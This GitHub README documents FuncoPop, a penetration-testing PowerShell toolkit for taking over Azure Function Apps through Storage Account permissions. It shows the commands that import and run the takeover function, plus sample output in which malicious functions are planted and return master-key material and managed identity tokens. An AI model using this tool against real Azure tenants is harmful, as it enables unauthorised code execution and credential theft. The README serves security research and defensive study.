![FuncoPopLogo](https://notpayloads.blob.core.windows.net/images/FuncoPop-bg-final.png)
<br> 
[![licence badge]][licence] 
[![stars badge]][stars] 
[![forks badge]][forks] 
[![issues badge]][issues]

![Twitter Follow](https://img.shields.io/twitter/follow/kfosaaen.svg?style=social)
![Twitter Follow](https://img.shields.io/twitter/follow/thomas_elling.svg?style=social)

[licence badge]:https://img.shields.io/badge/license-New%20BSD-blue.svg
[stars badge]:https://img.shields.io/github/stars/NetSPI/FuncoPop.svg
[forks badge]:https://img.shields.io/github/forks/NetSPI/FuncoPop.svg
[issues badge]:https://img.shields.io/github/issues/NetSPI/FuncoPop.svg


[licence]:https://github.com/NetSPI/FuncoPop/blob/master/LICENSE.txt
[stars]:https://github.com/NetSPI/FuncoPop/stargazers
[forks]:https://github.com/NetSPI/FuncoPop/network
[issues]:https://github.com/NetSPI/FuncoPop/issues


### FuncoPop: PowerShell Tools for Attacking Azure Function Apps

FuncoPop includes functions and scripts that support attacking Azure Funtion Apps, primarily through exploiting Storage Account Access. In many environments, users are granted generous Storage Account permissions (Storage Account Contributor) in Azure RBAC, resulting in access to Storage Accounts that support Function Apps. This unintended cross-service access can give an attacker the ability to pivot through Storage Accounts to gain access to Function Apps. This access includes visibility into the Funtion App keys, ability to run code in the Function App containers, and the ability to access Managed Identities attached to the Function Apps.

These tools were initially released as part of the "What the Function: A Deep Dive into Azure Function App Security" talk from the DEF CON 31 Cloud Village.

### Author, Contributors, and License
* Author:
	* Thomas Elling ([@thomaselling](https://twitter.com/thomas_elling)), NetSPI
	* Karl Fosaaen ([@kfosaaen](https://twitter.com/kfosaaen)), NetSPI
* License: BSD 3-Clause
* Required Dependencies: Az PowerShell Module

### Tool Usage
There are two parts to this tool - Extraction and Decryption

## Key Extraction
In order to run the key extraction tool, you will need to have an authenticated Azure (Az) PowerShell login with some role that allows Read/Write access to a vulnerable Function App Storage Account. In Powershell, you will need to import the function in order to run it.

**Importing the function:**
	`Import-Module .\Invoke-AzFunctionAppTakeover.ps1`

Once imported, you can run the function:
  `Invoke-AzFunctionAppTakeover -Verbose`

```
VERBOSE: Currently logged in via Az PowerShell as kfosaaen@notatenant.com
VERBOSE: Use Connect-AzAccount to change your user
VERBOSE: Dumping Function App information for Selected Subscriptions...
VERBOSE:    Enumerating Function App attached Storage Accounts in the TestEnvironment subscription
VERBOSE:            Function App Storage Account Found - POCstorageAccount1 - mystarterapp Function App
VERBOSE:            Function App Storage Account Found - POCstorageAccount2 - importantbankingapp Function App
VERBOSE:            Function App Storage Account Found - POCstorageAccount2 - lessimportantbankingapp Function App
VERBOSE:            Function App Storage Account Found - POCstorageAccount3 - managedidentityfunction Function App
[Truncated]
VERBOSE:    15 Function App Storage Accounts Enumerated in the Subscription
VERBOSE:    Dumping Function App information for selected Storage Accounts
VERBOSE:            Determining Function App Language of the managedidentityfunction function in the POCstorageAccount3 Storage Account
VERBOSE:                    Reviewing the managedidentityfunctiona16a File Share
VERBOSE:                            ASP.NET folder found in the managedidentityfunctiona16a File Share
VERBOSE:                            ASP.NET file found in the site/wwwroot/HttpTrigger1 folder in the managedidentityfunctiona16a File Share
VERBOSE:                            ASP.NET file found in the site/wwwroot/HttpTrigger2 folder in the managedidentityfunctiona16a File Share
VERBOSE:                            Attempting to add a new ASP.NET function to the managedidentityfunctiona16a File Share in the POCstorageAccount3 Storage Account
VERBOSE:                                    Creating the MFRgBWvsDIlkyfT folder in the managedidentityfunctiona16a File Share in the POCstorageAccount3 Storage Account and uploading files
VERBOSE:                                    Sleeping for 60 seconds before calling the new function
VERBOSE:                                    Calling the new function (until it stops 404-ing) to return the tokens and decryption key, this may take a while...
VERBOSE:                                            Avoid hitting ctrl+C to break out of this, you will need to manually remove the added Storage Account files in order to clean up
VERBOSE:                                    Removing the files from the Storage Account
VERBOSE:            Completed attacking the managedidentityfunction Function App in the managedidentityfunctiona16a File Share

FunctionApp        : managedidentityfunction
EncryptedMasterKey : bm9[Truncated]=
EncryptionKey      : 1B1[Truncated]9
ManagementToken    : eyJ[Truncated]g
VaultToken         : eyJ[Truncated]g
GraphToken         : eyJ[Truncated]Q

VERBOSE: All Function App / Storage Account attacks have completed
```

The function will prompt you to select a Subscription to attack. Once it has enumerated vulnerable Storage Accounts, you will be prompted with a list of accounts to attack. Select the ones you want to attack and the function will add malicious functions to the Storage Accounts, and attempt to execute them. These malicious functions will return the decryption key for the Function App Master Key, along with Managed Identity tokens (*if available).

Please note that the function supports PowerShell, ASP.NET, Python, and Node for payloads. At this time, attacking Java Function Apps is not supported, but may be added in the future.

Required Module to install:
* <a href="https://docs.microsoft.com/en-us/powershell/azure/new-azureps-module-az?view=azps-3.6.1">Az</a>

## Key Decryption
The easiest way to decrypt the keys returned from the PowerShell function is to run the Function App that we created to do the decryption.
### Host your own Function App to decrypt the keys
Use the following Deploy button to deploy a function app to your Azure subscription that can be used to decrypt the extracted keys.

[![Deploy to Azure](https://github.com/Azure-Samples/function-app-arm-templates/blob/main/images/deploytoazure.png?raw=true)](https://portal.azure.com/#create/Microsoft.Template/uri/https%3A%2F%2Fraw.githubusercontent.com%2FNetSPI%2FFuncoPop%2Fmain%2Fazuredeploy.json)

![image](https://github.com/NetSPI/FuncoPop/assets/2163397/64504f17-d872-4094-9106-5f2fe4be03b7)




### Related Blogs
* <a href="https://www.netspi.com/blog/technical/cloud-penetration-testing/what-the-function-decrypting-azure-function-app-keys/">What the Function: Decrypting Azure Function App Keys</a>
* <a href="https://blog.netspi.com/lateral-movement-azure-app-services/">Lateral Movement in Azure App Services</a>

### Presentations
* <a href="https://www.youtube.com/watch?v=f0ryxWuNzT4">What the Function: A Deep Dive into Azure Function App Security - DEF CON 31 - Cloud Village</a>
  - <a href="https://github.com/NetSPI/FuncoPop/blob/main/WhatTheFunction-DC31_CV.pdf">Slides</a>

### Previous Research
* <a href="https://rogierdijkman.medium.com/privilege-escalation-via-storage-accounts-bca24373cc2e">Rogier Dijkman - Privilege Escalation via storage accounts</a>
* <a href="https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/">Roi Nisimi - From listKeys to Glory: How We Achieved a Subscription Privilege Escalation and RCE by Abusing Azure Storage Account Keys</a>
* <a href="https://msrc.microsoft.com/blog/2023/04/best-practices-regarding-azure-storage-keys-azure-functions-and-azure-role-based-access/">MSRC - Best practices regarding Azure Storage Keys, Azure Functions, and Azure Role Based Access</a>
* <a href="https://medium.com/xm-cyber/10-ways-of-gaining-control-over-azure-function-apps-7e7b84367ce6">Bill Ben Haim & Zur Ulianitzky - 10 ways of gaining control over Azure function Apps</a>
* <a href="https://posts.specterops.io/abusing-azure-app-service-managed-identity-assignments-c3adefccff95">Andy Robbins – Abusing Azure App Service Managed Identity Assignments</a>
* <a href="https://whiteknightlabs.com/2024/05/07/abusing-azure-logic-apps-part-1/">Chirag Savla and Raunak Parmar – Abusing Azure Logic Apps – Part 1</a>


	
